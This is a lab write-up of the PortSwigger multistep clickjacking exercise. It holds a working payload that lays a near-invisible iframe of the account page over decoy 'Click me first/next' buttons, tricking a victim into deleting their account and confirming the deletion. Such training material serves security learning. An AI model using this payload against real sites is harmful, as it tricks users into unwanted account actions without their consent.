# Multistep clickjacking

## Description

[This lab](https://portswigger.net/web-security/clickjacking/lab-multistep) has some account functionality that is protected by a CSRF token and also has a confirmation dialogue to protect against clickjacking.

## Reproduction and proof of concept

1. Log in to the `wiener:peter` account on the target website.
2. Create payload:

* The iframe `src` URL points to the target website vulnerable page. In this case, the target website's user account page, and depends on the unique `lab-id`.
* An initial opacity of 0.1 to align the iframe actions and adjust the position values.
* Initial `$top_value1` and `$side_value1` values of resp `330px` and `50px` to align the "Delete account" button with the "Test me first" decoy action.
* Initial `$top_value2` and `$side_value2` variables of resp. `285px` and `225px` to align the "Test me next" decoy action with the "Yes" button on the confirmation page. 

```text
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.5;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:285px;
		left:200px;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://0a0100e003ab414dc0dbe6e7003a004a.web-security-academy.net/my-account"></iframe>
```

3. Go to the exploit server and paste the payload into the `body` field of the form.
4. Click **Store** and then **View exploit**. Hover over **Test me first** to make sure the cursor changes to a hand indicating that the `div` element is positioned correctly. If it is not, adjust the position of the div element by modifying the top and left properties inside the `firstClick` class of the style sheet. 
5. Click **Test me first** then hover over **Test me next** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, adjust the position of the div element by modifying the `top` and `left` properties inside the `secondClick` class of the style sheet. 
5. Change "Test me first" to "Click me first", "Test me next" to "Click me next", set `opacity` to `0.0001`, and click **Store**.

6. **Deliver exploit to victim**

## Exploitability

An attacker needs to have access to the site (`wiener:peter`) and construct an attack that fools the user into clicking the delete account button and the confirmation dialogue by clicking on "Click me first" and "Click me next" decoy actions.
